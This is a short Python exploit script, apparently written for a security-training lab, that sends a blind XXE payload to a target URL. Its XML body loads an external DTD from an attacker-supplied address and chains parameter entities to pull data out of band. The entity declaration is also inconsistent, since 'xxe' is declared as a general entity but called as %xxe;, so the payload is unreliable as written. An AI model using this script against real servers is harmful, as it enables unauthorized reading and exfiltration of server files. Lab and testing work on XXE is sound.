#!/usr/bin/python3
# -*- encoding: utf-8 -*-
#Author: afei

import requests, sys

def Blind_xxe():
    if(len(sys.argv) < 3):
        print("-----------------------------------------------")
        print(" ")
        print("Useg: python %s <target_url> <payload>" % sys.argv[0])
        print("eg1: python Blind_xxe-for-hetian-fourth.py http://x.x.x.x/x http://x.x.x.x/x.dtd" )
        print(" ")
        print("-----------------------------------------------")
        return
        
    url = sys.argv[1]
    payload = sys.argv[2]

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Accept': '*',
        'Content-type': 'text/xml,application/xml;charset=utf-8',
        'X-Requested-With': 'XMLHttpRequest'
    }
    
    xml = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "'+ payload +'"> %xxe;%int;%send;]>'
    
    result = requests.post(url, data=xml).text
    
if __name__ == '__main__':
    Blind_xxe()